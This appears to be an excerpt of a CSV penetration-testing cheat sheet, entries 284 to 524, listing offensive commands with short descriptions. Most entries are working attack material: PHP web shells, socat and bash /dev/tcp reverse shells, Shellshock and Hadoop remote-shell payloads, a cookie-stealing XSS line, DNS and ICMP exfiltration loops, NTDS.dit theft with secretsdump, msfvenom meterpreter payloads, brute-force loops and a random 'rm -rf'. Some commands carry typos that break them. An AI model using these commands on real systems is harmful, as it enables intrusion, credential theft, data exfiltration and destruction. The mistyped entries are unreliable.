+284,shutdown /m \\[victim] /r /t 0 /f,remote shutdown : /i as first option for gui,Shell
+285,ipconfig /displaydns,show dnscache,Cmd
+286,netstat -anop | findstr LISTEN,listening ports,Cmd
+287,tftp -I [victim] GET [file],"download a file, no longer default",
+288,netsh interface ip show,show interface information,Cmd
+289,netsh interface ip set address local static [ip] [mask] [gw] [ID],set static ip,Cmd
+290,netsh interface ip set dns local static [ip],set DNS server,Cmd
+291,netsh interface ip set address local dhcp,enable DHCP,Cmd
+292,makecab [file],compress file,
+293,wusa.exe /uninstall /kb: [id],uninstall patch : 2871997,Cmd
+294,rundll32.dll user32.dll LockWorkstation,lock the workstation,
+295,netsh advfirewall set currentprofile state off;netsh advfirewall set allprofiles state off;,disable local firewall,Cmd
+296,reg add HKCU\Software\Policies\microsoft\Windows\System /v DisableCHD /t,re-enable CMD,
+297,psexec /accepteula \\[victim] -u [domain]\[user] -p [password] -c -f \\[victim]\[share\[file],windows psexec : \\127.0.0.1\c$\cmd.exe -p can be pass OR hash,Psexec
+298,"reg add ""HKEY LOCAL MACHINE\SYSTEM\CurentControlSet\Control \TerminalServer"" /v DenyTSConnections /t REG_DWORD /d 0 /f",enable RDP,Cmd
+299,"reg add ""HKEY LOCAL MACHINE\SYSTEM\CurentControlSet\Control \TerminalServer\WinStations\RDP-TCP"" /v UserAuthentication /t REG_DWORD /d ""0"" /f",Disable NLA on RDP,Cmd
+300,wmic startupwmic service,start wmic service,Cmd
+301,wmic process list full,list all processes,Cmd
+302,wmic ntdomain list,Domain and DC info,Cmd
+303,wmic qfe,list patches,Cmd
+304,"wrnic process call create ""[cmd]""",execute command,Cmd
+305,"wmic process where name=""[cmd]"" call terminate",kill process,Cmd
+306,"wmic logicaldisk get description,name",view logical shares,Cmd
+307,"wmic /node:[victim] /user:[domain]\[user] /password:[password] process call create ""\\[host]\[share]\[exe]""",execute command on remote host from remote smb share,Cmd
+308,wmic /node:[victim] computersystern get username,get logged in users from the remote host,Cmd
+309,wmic /node:[victim] process list brief /every:1,list remote processes every second,Cmd
+310,"wmic /node:""[victim]"" path Win32_TerminalServiceSetting where AllowTSConnections=""0"" call SetAllowTSConnections ""1""",enble rdp on remote host,Cmd
+311,"wmic netlogin where (name like ""%[user]%"") get numberoflogons",How many times has someone logged in,Cmd
+312,"wmic service get name,displayname,pathname,startmode | findstr /i ""auto"" | findstr /i /v ""C:\windows\\"" | findstr /i /v """"""",unquoted service path search add node for remote sys,Cmd
+313,"wmic /node:[victim] /user:""[domain]\[user]"" /password:[pass] process call create ""cmd /c vssadmin list shadows 2 &1 >> c:\temp\vss.txt""",List volume shadow copies,Cmd
+314,"wmic /node:[victim] /User:[domain]\[user]"" /password:[pass] process call create ""cmd /c vssadmin create shadow /for=C: 2 &1 >> C:\temp\create_vss.txt""",create volume shadow copy for c,Cmd
+315,"wmic /node:[victim] /User:[domain]\[user]"" /password:[pass] process call create ""cmd /c copy \\?\GLOBALROOT\Device\[vsc]\Windows\System32\config\SYSTEM c:\temp\SYSTEM"" 2 &1 >> c:\temp\copy_system.txt",copy system out of a volume shadow copy,Cmd
+316,"wmic /node:[victim] /User:[domain]\[user]"" /password:[pass] process call create ""cmd /c copy \\?\GLOBALROOT\Device\[vsc]\NTDS\NTDS.dit c:\temp\ntds.dit"" 2 &1 >> c:\temp\copy_ntds.txt",copy out ntds from the voulme shadow copy,Cmd
+317,secretsdump.py  -hashes LMHASH:NTHASH -system ../SYSTEM -ntds ../ntds.dit local | tee hashes,Parse the SYSTEM and ntds with impacket,SecretsDump
+318,invoke-webrequest,powershell wget,
+319,wget,also powershell wget,Shell
+320,"(new-object system.net.webclient).downloadFile(""[url]"",""[dest]"")",Download a file using command line windows (windows wget),Powershell
+321,get-content,powershell type file,Powershell
+322,get-service,powershell services,Powershell
+323,get-psdrive,list of drives : cd Env:\ . . . mind . . . blown,Powershell
+324,get-help,RTFM *cough*,Powershell
+325,get-wmiobject -list 'netework',list interfaces with wmi,Powershell
+326,"[Net.DNS]::GetHostEntry(""ip"")",get dns addr tab after :: for more choices,
+327,Get-WmiObject -class win32 operatingsystem | select -property * | exportcsv c:\temp\os.txt,get system information,Powershell
+328,New-PSDrive -Persist -PSProvider FileSjstem -Root \\[ip]\tools -Name i,powershell mount remote share : think sysinternals remote share,Powershell
+329,"Get-ChildItem -Path c:\ -Force -Recurse -Filter *.txt -ErrorAction SilentlyContinue | where {$_.LastWriteTime -gt ""2017-01-13""}",txt files changed after the 13 Jan 2017,Powershell
+330,"$ports=([ports]);$ip=[ip];foreach ($port in $ports){try{$socket=New-Object System.Net.Sockets.TCPClient($ip,$port);}catch{}; if $socket -eq $NULL {echo $ip "": ""$port"" : Closed"";}else{echo $ip "": ""$port"" : Open"";}$socket = $NULL;}}",powershell port scanning,Powershell
+331,"$ping = New-Object System.Net.Networkinformation.ping;$ping.Send(""[ip]"",50O);",Ping ip with timeout of 500,Powershell
+332,"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass $Host.UI.PromptForCredential(""[title]"",""[message]"",""[user]"",""[domain]"")",Ask user for credentials,Powershell
+333,"powershell.exe -Command ""do {if ((Get-Date -format yyyymmdd-HHmm) -match '201308(0[8-9]|1[0-1])|0[8-9]|1[0-7])[0-5][0-9]'){Start-Process -WindowStyle Hidden ""[exe]"";Start-Sleep -s 14400}}while(1)""","powershell run on schedule, match says when run",Powershell
+334,"powershell.exe Send-MailMessage -to ""[victim]"" -from ""[from]"" -subject ""[subject]"" -a ""[Attach file path]"" -body ""[Body]"" -SmtpServer [ServerIP]",Powershell send an email,Powershell
+335,"Get-WmiObject -ComputerName [DC] -Namesapce root\microsoftDNS -class MicrosoftDNS_ResourceRecord -Filter ""domainname='[domain]' | select textrepresentation",list hostname and ip for domain pc's,Powershell
+336,"powershell.exe -noprofile -noninteractive -command ""[System.Net.ServicePointManager]::ServerCertificateValidationCallback{$true}$server=""[$ip]/[script]"";$filepath=""c:/temp/SYSTEM"";$http = new-object System.Net.Webclient; $response = $http.uploadFile($server,$filepath);""","Powershell upload file VIA post, script must write this out",Powershell
+337,msfvenom -p Windows/meterpreter/reverse_https -f psh -a x86 LHOST=[lhost] LPORT=[lport] audit.ps1,powershell shell,MSFVenom
+338,HKLM\Software\Microsoft\Windows NT\CurrentVersion,Windows information in the reg,
+339,HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU,Mapped drives in reg,
+340,HKLM\System\MountedDevices,Mounted devices,
+341,HKLM\System\CurrentControlSet\Enum\USBStor,USB Devices,
+342,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\IPEnableRouter,"enable ip routing in windows, use as GW",
+343,HKLM\Security\Policy\PolAdTev,Audit policy,
+344,HKLM\Software\Microsoft\Windows NT\CurrentControlSet\Services,Kernel or User Services,
+345,HKLM|HKCU\Software,Machine or User software,
+346,HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs,Recent Documents,
+347,HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedMRU & \OpenSaveMRU,Recent user location (MRU Most Recntly used),
+348,HKCU\Software\Microsoft\Internet Explorer\TypedURLs,Typed Urls,
+349,dsquery user -limit 0,list users,
+350,"dsquery group ""cn=users,dc=[domain],dc=[tld]""",List groups for domain.com,
+351,"dsquery group -name ""domain admins"" | dsget group -members -expand","Get Domain admins (prefer net groups ""domain Admins"")",
+352,dsquery user -name [user] | dsget user -memberof -expand,get groups for user (net groups [user]),
+353,dsquery user -name [user] | dsget user -samid,get user login name,
+354,dsquery user -inactive 2,List accounts that have been inactive for two weeks,
+355,"dsquery * ""DC=[domain],DC=[tld]"" -scope subtree -attr ""cn"" ""opperatingSystem""",List os's in the domain,
+356,dsquery site -o rdn -limit 0,list site names,
+357,dsquery subnet -site [site] -o rdn,list subnets within the sites shown,
+358,dsquery server -site [site] -o rdn,list servers within site,
+359,host [domain],list DC's,
+360,https://hashcat.net/wiki/doku.php?id=example_hashes,hash list,
+361,"Function Test-ADAuthentication {param($username,$password);echo ""$username $password"";(new-object directoryservices.directoryentry"""",$username,$password).psbase.name -ne $null}; forEach ($userName in Get-Content ""user_logins.txt""){Test-ADAuthentication $userName password >> test4.txt;}","Simple powershell brute force, user input list, checks the password 'password'",
+362,common ports,see /etc/services,
+363,TTL: 128 = Windows | 64 = linux | 255 = generic OR solaris,Networking Time to Live,
+364,Window Size: 5840 = Linux | 5720 = Google Nix | 65535 = XP or BSD | 8192 = Visa and above | 4128 = Cisco Router,Networking Time to Live,
+365,"Class Ip ranges : Go away, there was A,B,C,D,E. WAS AS IN NOT ANY MORE!",Classfull networks have not existed since 1993 cisco GTFO with telling people they exist,
+366,Subnet ranges : /20 255.255.240.0 4096 hosts,"please use ipcalc, there is no l33tness in doing it in your head",
+367,ipcalc -bnmp 10.0.0.1/20,Ip subnets,
+368,"socat TCP-LISTEN:8080,reuseaddr,fork TCP6:[RHOST]:[RPORT] ./[tool] 127.00.0.1:8080",Route IPV6 through ipv4 for things that don't support it,
+369,enable,raise privs cisco,
+370,conf t,start configuration,
+371,show session,show sessions,
+372,show version,show version,
+373,show running-config,"show the config which is running in flash, looking for password 7 and the like",
+374,show startup-config,show the config which runs on start up,
+375,show ip interface,show interface information : add breif for less,
+376,show ip route,show the routes of the switch,
+377,show access-lists,show the ACL for the switch,
+378,http://[ip]/level/56/exec/show/config,Bypass auth on ios 11.2-12.2,
+379,file2cable -i eth0 -f [file],replay packets to network,
+380,"dnsrecon -t rvs -i 10.0.0.1,10.0.0.255",Reverse look up on range,
+381,dnsrecon -t std -d [domain],brute names,
+382,dnsrecon -t axfr -d [domain],do a zone transfer request (just use host . . .),
+383,ftp -s ftp.txt,"uninteractive FTP, read commands from file",
+384,for line in `base64 -w 62 [file]`; do host $line.[hostname]; done,"exfil file through DNS, may want to encrypt, also assuming you have a short domain",
+385,for a in {a..z}; do for b in {a..z}; do for c in {a..z}; do for d in {a..z}; do whois $a$b.$c$d; done; done;done;done,"look for a free short domain, good luck",
+386,"ping -p 11010101010101010101010101010199 -c 1 -M do 127.0.0.1 -s 32; for line in `base64 sslfile.key | xxd -p -c 14`; do line2=`echo ""11 $line 99"" |tr -d ' '`; ping -p $line2 -c 1 -M do 127.0.0.1 -s 32; done; ping -p 11101010101010101010101010101099 -c 1 -M do 127.0.0.1 -s 32",Exfil over icmp,
+387,fpipe.exe -l [lport] -r [rip] [ip],forward local traffic htting lport to [rip]:[rport],
+388,socat TCP4:LISTEN:[lport] TCP4:[rip]:[rport],forward local traffic htting lport to [rip]:[rport],
+389,for i in {1..65000}; do echo 1 > /dev/tcp/[ip]/$i; echo $i; done,"tcp port scanning from bash, just wireshark on the ip, useful if you have cmd execution on web app",
+390,ssh -o StrictHostKeyChecking=no -t -t -i [private_key] -R [lport]:[rhost]:[rip] [user]@[ip],"ssh port forward [victim]:[port] to [ip]:[port], access by localhost:[port], rhost can be 127.0.0.1",
+391,plink.exe -N -i [private_key] -R [lport]:[rhost]:[rip] -l [user] [ip],"ssh port forward [victim]:[port] to [ip]:[port], access by localhost:[port], rhost can be 127.0.0.1. Privte key needs to be in putty format, a PPK",
+392,ssh -D [port] [user]@[ip],"set up a socks proxy, proxycahins may help also",
+393,msfvenom --payload windows/meterpreter/reverse_tcp --format exe --template calc.exe -k --encoder x86/shikata_ga_ni -i 5 LHOST=[lhost] LPORT=[lport] evil.exe,create a evil calc,MSFVenom
+394,ettercap -TP rand_flood,"try to make the switch fall over, and turn into a hub",
+395,hash lengths : MD5=16 | SHA1=20 | SHA256=32 | SHA512=64,Hash byte lengths,
+396,"for i in *; do pdfinfo $i | egrep -i ""Auth""; done  | sort","generate user list from PDF's, you can get more info to such as pdf maker",
+397,"for i in `cat dets`; do echo ""Sening Spam from $i""; mailx -s ""Report Attached"" -r ""`echo $i | awk -F @ '{print $1}'`<`echo $i | awk -F : '{print $1}'`>"" -a report.pdf -S smtp-auth=login -S smtp-auth-user=""`echo $i | awk -F : '{print $1}'`"" -S smtp-auth-password=""` echo $i | awk -F : '{print $2}'`"" -S ssl-verify=ignore -v -S smtp=""10.11.1.229"" [victim] < email;echo _________; done",Loop around 'dets' (user:pass) and send an email through an authenticated mailserver with an attached file whos contents is stored in 'email',
+398,https://gchq.github.io/CyberChef/,Common operations on data,
+399,schtasks /query /fo LIST /v,"List windows scheduled tasks, older windows defender",
+400,"wmic qfe get Caption,Description,HotFixID,InstalledOn",list installed patches on windows,
+401,reg query [HKCU|HKLM]\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated,Do MSI's have admin rights?,
+402,echo %path%,show the current path to see if we can subvert anything,
+403,sc sdshow [service],"Show service permissions, look for AU|AN|DU|LG, manual AccessChk, may help with bob ;)",
+404,nmblookup [name],Do a netbios name query.,
+405,"export PS1=""# \A:\[$(tput sgr0)\]\[\033[38;5;1m\]\u:\W:\[$(tput sgr0)\] """,Pretty terminal PS1 that is copy n paste safe,
+406,apropos [keyword],search the manual page names and descriptions,
+407,sntp [ip],Query the remote ntp time,
+408,host -t axfr [ip],Ask for a zone transfer,
+409,rusers -al [ip],show users rlogin,
+410,net use z:\ \\[ip]\[share] /user:[domain]\[username] [password] /p:no [password],mount a share within windows,
+411,samrdump.py -hashes [LMHASH:NTHASH] [user]:[pass]@[victim],List users of the remote system,
+412,rlogin -l [user] [target],Login using rlogin : Not installed by default,
+413,finger @[ip],Show remote users using finger : Not installed by default? : use 0@[ip] for Solaris bug,
+414,tnscmd10g version -h [victim],Fingerprint remote oracle server,
+415,CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid curren_user is pragma autonomous_transaction; begin execute immediate 'grant dba to user1 identified by pass1'; commit; return 'FOO'; end;,Get Current user oracle DB : CMD new lines removed,
+416,./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1,Try to brute the remote group name : cisco,
+417,sed -i 's/[[:space:]]*$//' [input],Remove trailing whitespace,
+418,thc-pptp-bruter -u [username] -W -w /usr/share/wordlists/nmap.lst,Brute force PPTP password,
+419,"./shocker.py -H TARGET  --command ""/bin/cat /etc/passwd"" -c /cgi-bin/status --verbose",NCC Shellshock tool,
+420,"echo -e ""HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n"" | nc TARGET 80",Shellshock Read File : Replace echo with anything you want,
+421,php -S 0.0.0.0:80,PHP simple server,
+422,"int main(void){setresuid(0, 0, 0);system(""/bin/bash"");}",Simple SUID program  ,
+423,"perl -e 'exec ""/bin/bash"";'",perl spawn bash,
+424,"python -c 'import pty;pty.spawn(""/bin/bash"")'",python spawn bash,
+425,!bash,"Call a shell from a number of programs, VIM, Nmap FTP SFTP etc",
+426,POST: {“listing”:{“directions”:[{“test”:[{“abc”:”#{%x[‘ls’]}+foo”}]}] }},Ruby on Rails String Interpolation  : anything in #{} is executed,
+427,Get-ADUser -Filter 'useraccountcontrol -band 65536' -Properties useraccountcontrol | export-csv U-DONT_EXPIRE_PASSWORD.csv,Check for accounts that don't have password expiry set,
+428,Get-ADUser -Filter 'useraccountcontrol -band 32' -Properties useraccountcontrol | export-csv U-PASSWD_NOTREQD.csv,Check for accounts that have no password requirement,
+429,Get-ADUser -Filter 'useraccountcontrol -band 128' -Properties useraccountcontrol | export-csv U-ENCRYPTED_TEXT_PWD_ALLOWED.csv,Accounts that have the password stored in a reversibly encrypted format,
+430,Get-ADUser -Filter 'useraccountcontrol -band 524288' -Properties useraccountcontrol | export-csv U-TRUSTED_FOR_DELEGATION.csv,List users that are trusted for Kerberos delegation,
+431,Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | export-csv U-DONT_REQUIRE_PREAUTH.csv,List accounts that don't require pre-authentication,
+432,Get-ADUser -Filter 'useraccountcontrol -band 2097152' -Properties useraccountcontrol | export-csv U-USE_DES_KEY_ONLY.csv,List accounts that have credentials encrypted with DES,
+433,"ldapsearch -x -LLL -E pr=200/noprompt -h [victim] -D ""[domain]\\[user]"" -w '[password]' -b ""dc=[fqdn],dc=co,dc=uk""",Dump Ldap structure,
+434,ncrack -u administrator -P 500-worst-passwords.txt -p 3389 10.212.50.21,brute force RDP,
+435,/opt/jre1.8.0_91/bin/javaws [something].jnlp,run a java web start JNLP,
+436,/opt/jre1.8.0_91/bin/jcontrol,Open java control pannel,
+437,Custom iterator -> 1 + Seperator for 1 ->  2 -> payload processing b64 ,brute force HTTP basic burp,
+438,"for i in `cat [users]`; do for j in `cat [passwords]`; do wget -c --http-user='[domain]\$i' --http-password=$j https://[url] --no-check-certificate -e use_proxy=yes -e https_proxy=127.0.0.1:8080 2>index.html; grep -i fail index.html; rm index.html; echo $i:$j; echo ""___"" ; done; done | tee ntlm_brute","NTLM brute force, if msf is broke : assumes fail is in Index, curl is still bugged?",
+439,java -jar ysoserial-0.0.2-all.jar CommonsCollections1 '[command]' > payload.out,YsoSerial code execution ,
+440,"grep -ir wpdb . | egrep -i ""get_r|insert|escape|query"" | egrep ""_GET|_POST|_REQUEST|\$"" | grep --color wpdb.",Very Basic SQLI test in wp plugin,
+441,<?php if (isset($_GET['Password'])){passthru($_GET['cmd']);} ?>,"Php Simple shell, set aPasswordto access, cmd is your command: See Commix to use this easily",
+442,<?php if (isset($_GET['Password'])){exec($_GET['cmd']);} ?>,"Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily",
+443,<?php if (isset($_GET['Password'])){system($_GET['cmd']);} ?>,"Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily",
+444,<?php if (isset($_GET['Password'])){eval($_GET['cmd']);} ?>,"Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily",
+445,<?php if (isset($_GET['Password'])){shell_exec($_GET['cmd']);} ?>,"Php Simple shell, set Password to access, bis your command: See Commix to use this easily",
+446,X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*,EICAR Test string,
+447,"./bin/hadoop jar share/hadoop/tools/lib/hadoop-streaming-2.7.3.jar -input /tmp/out/1 -output /tmp/out/NC_1 -mapper ""bash -i >& /dev/tcp/[ip]/[port] 0>&1"" -reducer NONE -cmdenv user.name=hdfs -cmdenv as=hdfs -verbose -mapdebug ""bash -i >& /dev/tcp/[ip]/[port] 0>&1""","Hadoop Command execution, of course replace the shell with whatever you want",
+448,"for i in $(ls -alh /data/shares/opt/ | grep ""^drw"" | awk '{print $9}'); do cd /data/shares/opt/$i; git pull; echo $i;done | grep -v fatal",GitUp : Update all the opt gits,
+449,hping -S -y -m 1300 -p 445 shared,TCP ping : Check MTU,
+450,ping 8.8.8.8 -M do -s 1476 -f,ICMP : Check MTU,
+451,https://jsfiddle.net/byf89m43/2/,JSFiddle skele,
+452,aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2,Check for UNauth access to bucket,
+453,"xfreerdp +clipboard /drive:[sharename],[path] /u:[user] /d:[domain] /p:[password ] /size:80% /v:[host]",XfreeRDP new swtich format,
+454,<img src=127.0.0.1 onerror=this.src='http://[server]/?cookie='+document.cookie>,Simple steal cookie,
+455,ssh username@server -w any:any & ip addr add 100.64.1.2/32 peer 100.64.1.1 dev ; ssh root@[ip] -C 'ip addr add 100.64.1.1/32 peer 100.64.1.2 dev tun0; route add -net [destnet]/16 gw 1.1.1.1;,Create a SSH based TAP VPN,
+456,./hans -v -f -s 100.64.1.1 -p [password]; ./hans -f -c [ip] -p [password] -v,"Hans ICMP tunnel, first cmd is server, second client",
+457,iodined -f -c -P [password] 100.164.1.1 [serveraddr]; iodine -f -P [password] [serveraddr] -r,"ICMP tunnel, first cmd is server, second client",
+458,ruby ./dnscat2.rb tunneldomain.com; ./dnscat2 tunneldomain.com,"DNS tunnel, first cmd is server, second client.",
+459,"echo ""Username [user]"" >> config; echo ""Password [pass]"" >> config; echo ""Domain [domain]"" >> config; echo ""Proxy [proxyIP]"" >> config; echo ""Tunnel [lport]:[lip]:[rport]"" >> config; cntlm.exe -c config.conf","NTLM aware proxy client, proxychains",
+460,"echo ""[ProxyList]"" > /etc/proxychains.conf; echo ""socks4  127.0.0.1 2222"" >> /etc/proxychains.conf; proxychains [program]",Run program over socks proxy,
+461,"socat TCP-LISTEN:[lip],reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane; socat FILE:`tty`,raw,echo=0 TCP:[rip]:[rport]","Socat BindShell, First on server, second on client",
+462,"socat TCP-LISTEN:[lip],reuseaddr FILE:`tty`,raw,echo=0; socat TCP4:[rip]:[rport] EXEC:bash,pty,stderr,setsid,sigint,sane","Socat reverse shell, First on client, second on server",
+463,getent passwd; getent group;,enumerate users and groups,
+464,"/opt/commix/commix.py -u ""https://[rip]:443/[resource]?[password]&cmd=1*"" --force-ssl","Commix abuse exec as per the php shells, nicer than burp repeater! ",
+465,openssl aes-256-cbc -in some_file.enc -out some_file.unenc -e -pass pass:somepassword,"OpenSSL Encypt, add -a if input is b64, ",
+466,openssl aes-256-cbc -in some_file.enc -out some_file.unenc -d -pass pass:somepassword,"OpenSSL decrypt, add -a if input is b64, ",
+467,10.0.0.0/8 (10.255.255.255) | 172.16.0.0/12 (172.31.255.255) | 192.168.0.0/16 | 100.64.0.0/10 (10.127.255.255),"Internal Address ranges, 100 is for routing",
+468,/usr/bin/gpp-decrypt [cpassword],"Decrypt group policy preferences password aka Cpassword, use LAPS not GPP",
+469,sudo rm -rf $(sudo find / -type f | shuf -n1),Pick a file at random . . .,
+470,"history | awk '{a[$2]++}END{for(i in a){print a[i] "" "" i}}' | sort -rn | head",Most used Terminal commands,
+471,"cat [file]  | grep ""ACCOUNT FOUND"" | grep -v 0x000072:STATUS_ACCOUNT_DISABLED | awk  -F User: '{print $2}' | awk -F : '{print $1, $2}' | awk -F \\[SUC '{print $1}' | awk -F "" Password  "" '{print $1"":""$2}' | sort | sed s/' '/''/| uniq ","Grab Succsessfull passwords from a tee'd medusa, bah to spaces in usernames",
+472,"for i in `cat ../clean_creds`; do echo $i | awk -F : '{print ""tsql -S [IP] -p 1433 -U [domain]\\\\""$2"" -P ""$3}'; done","Take the active users output and create filled in CMD's, course it can be anything, not just TSQL",
+473,dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp,Project your mic to remote hosts speakers,
+474,apt-file update; apt-file search [xfreerdp],Equivlent of Yum whatprovides : What provides what file,
+475,yum whatproivdes ,Equivlent of apt-file search : What provides what file,
+476,fcrackzip -D -p 'x' -u test.zip,Crack a ZIP file with a wordlist,
+477,fcrackzip -D -p 'x' -u test.zip,"Crack a zip, brute force a 4 char password ",
+478,"perl -e 'print ""A""x10000; print ""\n""'","Repeat A x times pipe into where you think the overflow location is, look for 0x41's",
+479,pattern_create.rb -l 2700,"create a patern of 2700 bytes to isolate the buffer size you have, part of msf, look for value of EIP ",
+480,pattern_offset.rb -l 2700 -q [EIP],Get the exact offset for the EIP,
+481,"""\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff""","Bad Char's block, re-send removing bad ones",
+482,!mona modules,Work out if there are any juicy targets to look for a jmp esp in (imunity debuger),
+483,!mona find '\xff\xef' -m [dll],Look for a JMP ESP in the DLL found in the mona modules,
+484,"msfvenom -p windows/shell_reverse_tcp LHOST=[LIP] LPORT=[LPORT] -f c -b ""\x00"" ","Create shellcode which connects back on port can add –e x86/shikata_ga_nai, -b is bad chars",MSFVenom
+485,"xrandr   --output `xrandr -q | grep ""connected"" | grep -v dis | awk '{print $1}' | head -n 1` --rotate  inverted",Anoy a co-worker by rotating their screen,
+486,find / \( -type f -a -user root -a -perm -4001 \) 2>/dev/null,Locate SUID files owned by root,
+487,"echo ""https://www.kernel-exploits.com/kernel/?version=""`uname -r  | awk -F . '{print $1"".""$2}'`",Quick formatted link to check ketne exploits,
+488,<% style=behavior:url(: onreadystatechange=alert(1)>,Asp.net filter evasion,
+489,patator.py unzip_pass zipfile=[file] password=FILE0 0=[pass.txt] -x ignore:code!=0,"Crack a zip file, Note: Older enc only",
+490,softwareupdate -l,Show updates available to a MacOS device,
+491,"man -P 'less -p "".*Tables""' ascii",Show a compact ascii table,
+492,"nmap -sU --top-ports 1000 -oA clientname_udp -iL scope -v --open & nmap -A -oA clientname_ce -p- -iL scope -v --open & nmap -A -oA clientname_ce_quick --script /usr/share/nmap/scripts/http-screenshot.nse -p 80,443,21,22,23,25,109,110,990,465,1194,1723,8080,8081,8443,8843,8000,9000,9090,9081,9091,8194,9103,9102,8192 -iL scope -v --open;","Do a quick nmap of the top 1000 UDP, all TCP, and common HTTP ports",
+493,"<%=""Hello Word""%>","Echo hello world, test for RCE in JSP application.",
+494,"out.print(""Hello World"");","Echo hello world, test for RCE in JSP application.",
+495,"<c:out value=""${[variableName]}"" />","Echo hello world, test for RCE in JSP application.",
+496,"for line in $(tshark -r [pcap] -T fields -e data  | uniq | grep -v ""......................................................"" | sed s/.*11/11/g | grep ""11.*99""  | sed s/11// | sed s/99$// | tr -d '\n' | sed s/0101010101010101010101010101/'\n'/g |sed s/010101010101010101010101010//g); do echo $line | xxd -r  -p | base64 -d;echo +++++++++++++++++++; done",Convert exfil ICMP back to files from pcap,
+497,mount -t nfs 10.0.0.2:[/their/share] [/Mount/point] -o nolock,Mount a NFS share (check for root squash),
+498,/path/to/odat/odat-libc2.5-x86_64 sidguesser -s [IP],Used to guess common SIDs in Oracle databases,
+499,/path/to/odat/odat-libc2.5-x86_64 passwordguesser -d [SID] -s [IP],Used to brute common passwords in Oracle TNS listener,
+500,ping6 -c1 -I < [Interface] ff02::1 | tee ipv6-hosts,Piped to tee for later manipulation,
+501,udp-proto-scanner.pl -f [FileOfIP],Quick and dirty UDP service discovery,
+502,snmpget udp6:[ipv6 address] [OID],SNMPGet supports ipv6,
+503,"curl http://192.168.123.123/path/to/cgi- bin/name_of_vuln_cgi -H ""custom:() { ignored; }; /bin/bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1 ""","Exploit shellshock via curl, use -k switch to force curl to bypass any SSL warnings. Replace the bash command with anything.",
+504,padbuster [url] [EncodedData] 8 --cookies '[UserCookies]'  -encoding 0 --plaintext user=[TextToEncode],"Padding Oracle attack, break encrypted cookies",
+505,"upower -i $(upower -e | grep 'BAT') | grep -E ""state|to\ full|percentage""",Check battery level,
+506,"def process = ""ls -l"".execute();println ""Found text ${process.text}""","Execute GroovyScript on Jenkins, You can also execute commands when ReBuilding projects. Also user addition has a path traversal vuln allowing you to override users when registering.",
+507,urlcrazy [domain],"Generate and test domain typos and variations to detect and perform typo squatting, URL hijacking, phishing, and corporate espionage.",
+508,kerbrute bruteusers [flags],brute single user password,
+509,kerbrute brutforce [flags],brute username:password combos from file or stdin,
+510,kerbrute passwordspray [flags],test a single password agains a list of users,
+511,kerbrute userenum [flags],Enumerate valid domain usernames via kerberos,
+512,nth --text '<hash>',Find the hash type of a string,
+513,nth --file <hash file>,Find the hash type of a file,
+514,nmap --script vuln <HOST_IP>,scan for vulnerabilites,
+515,nikto -h <HOST_IP>,Scan host for vulnerabilites,
+516,smbclient -L \\\\<HOST_IP>,check for misconfigured anonymous login,SMBClient
+517,hydra -l <username> -P <password list> <HOST_IP> http-post-form '<url where requests are made> : request with ^USER^ and ^PASS^ in it : <output string on failure>',Brutforce a webpage looking for usernames,Hydra
+518,smbmap -u <user> -p <pass> -H <host IP>,enumerates SMB file shares,
+519,wpscan --url <wp site> --enumerate --plugins-detection,Enumerate Wordpress website,
+520,wpscan --url <HOST_IP> --usernames <USERNAME_FOUND> --passwords wordlist.dic,enumerate though known usernames,
+521,powershell.exe -exec bypass,bypass execution policy,
+522,theharvester -d <domain> -l <#> -g -b google,gathering informaiton from online sources,
+523,nc -lvnp <port #>,open a listener,
+524,nc <attacker ip> <attacker port>,Connect to computer,
